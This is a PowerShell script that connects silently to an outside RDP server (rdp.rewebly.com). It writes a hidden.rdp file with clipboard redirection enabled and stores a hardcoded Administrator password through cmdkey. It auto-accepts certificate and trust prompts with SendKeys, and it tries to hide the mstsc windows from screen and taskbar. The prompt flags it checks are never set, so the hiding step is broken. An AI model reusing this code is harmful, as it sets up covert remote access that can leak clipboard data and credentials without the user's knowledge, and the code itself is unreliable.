# --- CONFIGURATION ---
$server = "rdp.rewebly.com"
$username = "Administrator"
$password = "!Mamoute901901a"
$logFile = "$env:TEMP\rdp_log.txt"

function Log($msg) {
    $timestamp = (Get-Date).ToString("HH:mm:ss.fff")
    $entry = "[$timestamp] $msg"
    Write-Host $entry
    Add-Content -Path $logFile -Value $entry
}

Clear-Content -Path $logFile -ErrorAction SilentlyContinue
Log "Starting RDP automation script..."

# --- RDP file ---
$rdpContent = @"
full address:s:$server
username:s:$username
redirectclipboard:i:1
screen mode id:i:2
authentication level:i:2
enablecredsspsupport:i:1
prompt for credentials:i:0
"@
$rdpFile = "$env:TEMP\hidden.rdp"
Set-Content -Path $rdpFile -Value $rdpContent -Encoding ASCII
Log "RDP file written to $rdpFile"

# --- Store credentials ---
cmdkey /generic:TERMSRV/$server /user:$username /pass:$password
Log "Stored credentials with cmdkey"

# --- Launch RDP ---
$proc = Start-Process -FilePath "mstsc.exe" -ArgumentList $rdpFile -WindowStyle Minimized -PassThru
Log "Launched mstsc.exe (PID $($proc.Id))"

# --- Load SendKeys and Win32 APIs ---
Add-Type -AssemblyName System.Windows.Forms

if (-not ("Win32" -as [type])) {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr FindWindowEx(IntPtr hWndParent, IntPtr hWndChildAfter, string lpszClass, string lpszWindow);
    }
"@
}


Start-Sleep -Milliseconds 2000


[System.Windows.Forms.SendKeys]::SendWait("%n")
[System.Windows.Forms.SendKeys]::SendWait("%c")


# --- Delay 2 seconds before certificate prompt check ---
Start-Sleep -Milliseconds 2000

[System.Windows.Forms.SendKeys]::SendWait("%y")



# --- Hide mstsc.exe windows after prompts ---
if ($certPromptClicked -or $trustPromptClicked) {
    Log "Proceeding to hide mstsc windows..."

    if (-not ("Win32Enum" -as [type])) {
        Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        public class Win32Enum {
            public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
            [DllImport("user32.dll")]
            public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
            [DllImport("user32.dll")]
            public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
            [DllImport("user32.dll")]
            public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
            [DllImport("user32.dll")]
            public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
            [DllImport("user32.dll")]
            public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
        }
"@
    }

    $mstscId = $proc.Id
    $handles = @()

    $callback = [Win32Enum+EnumWindowsProc]{
        param($hWnd, $lParam)
        $out = 0
        [Win32Enum]::GetWindowThreadProcessId($hWnd, [ref]$out) | Out-Null
        if ($out -eq $mstscId) { $script:handles += $hWnd }
        return $true
    }

    [Win32Enum]::EnumWindows($callback, [IntPtr]::Zero) | Out-Null
    Log "Found $($handles.Count) mstsc windows to hide"

    foreach ($hwnd in $handles) {
        [Win32Enum]::ShowWindowAsync($hwnd, 0) | Out-Null  # SW_HIDE
        $exStyle = [Win32Enum]::GetWindowLong($hwnd, -20)
        $newExStyle = ($exStyle -bor 0x00000080) -band (-bnot 0x00040000)
        [Win32Enum]::SetWindowLong($hwnd, -20, $newExStyle) | Out-Null
    }
    Log "All mstsc windows hidden"
} else {
    Log "Skipping window hiding because no prompts were confirmed"
}

Log "Script complete. Logs written to $logFile"
